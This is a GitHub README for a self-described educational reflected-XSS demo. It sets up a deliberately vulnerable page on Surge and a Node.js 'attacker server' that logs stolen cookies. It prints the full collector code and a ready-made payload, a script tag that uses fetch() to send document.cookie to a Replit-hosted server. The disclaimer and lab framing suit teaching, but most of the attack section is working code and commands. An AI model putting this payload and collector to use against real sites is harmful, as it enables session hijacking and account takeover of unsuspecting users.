
# 🧪 XSS Demo (Educational Purpose Only)

  

This repository demonstrates a basic **Reflected Cross-Site Scripting (XSS)** attack. It is divided into two parts:

  

-  **Victim Site** – A vulnerable web page hosted using Surge.

-  **Attacker Server** – A Node.js-based server that logs cookies received via an XSS payload.

  

---

  

## ⚠️ Disclaimer

  

> This project is intended **strictly for educational purposes** only.
> Do **NOT** use this in production environments or against any systems you do not own or have explicit permission to test.
> The purpose is to **learn and demonstrate XSS attacks responsibly** in a controlled environment.

  

---

  

## 📁 Folder Structure

  

```

xss-demo/

│

├── victim/

│ └── index.html # Vulnerable page that reflects user input

│

├── attacker/

│ └── attacker.js # Server-side receiver for stolen cookies

│

└── readme.md

```

  

---

  

## 📥 1. Clone the Repository

  

```bash

git  clone  https://github.com/YOUR_USERNAME/xss-demo.git

cd  xss-demo

```

  

---

  

## 🌐 2. Deploy the Victim Page on Surge

  

Make sure you have [Surge](https://surge.sh) installed:

  

```bash

npm  install  --global  surge

```

  

Then deploy the victim folder:

  

```bash

cd  victim

surge  .  https://xss-victim-demo.surge.sh

```

  

---

  

## 💻 3. Running the Attacker Server

  

You have **two options**:

  

---

  

### 🔸 Option A: Run it Locally Using Node.js

  

1. Navigate to the attacker folder:

  

```bash

cd attacker

```

  

2. Use the provided Node.js server code in `attacker.js`:

```js

const  http = require('http');

const  url = require('url');

  

http.createServer((req, res) => {

const  queryObject = url.parse(req.url, true).query;

console.log("🔥 Stolen cookie:", queryObject.cookie);

res.end('Cookie received');

}).listen(3000, () => {

console.log('Attacker server listening on port 3000');

});

```

  

3. Run it:

```bash

node attacker.js

```

  

> 🔒 Note: This works only locally unless you expose the server (e.g., using `ngrok`).

  

---

  

### 🔸 Option B: Use Replit (Recommended for Public Demo)

  

1. Go to [https://replit.com](https://replit.com)

2. Create a new **Node.js Repl**

3. Paste the content of `attacker.js` into `index.js`

4. Click **Run** to start the server

5. Use the Replit public URL in your payload (e.g. `https://your-repl.replit.app/steal?cookie=...`)

  

---

  

## 🚨 4. Trigger the XSS Payload

  

Now visit the following URL in your browser:

  

```

https://xss-victim-demo.surge.sh/?q=<script>fetch("https://your-repl.replit.app/steal?cookie="+document.cookie)</script>

```

  

This will:

  

- Load a script into the vulnerable victim site

- Send `document.cookie` to your attacker server

- Log the cookie in your local or Replit console

  

---

  

## 🙌 Credits & Notes

  

- Developed for educational purposes only.

- Created by [Dinesh](https://github.com/dinesh-thirugnanam)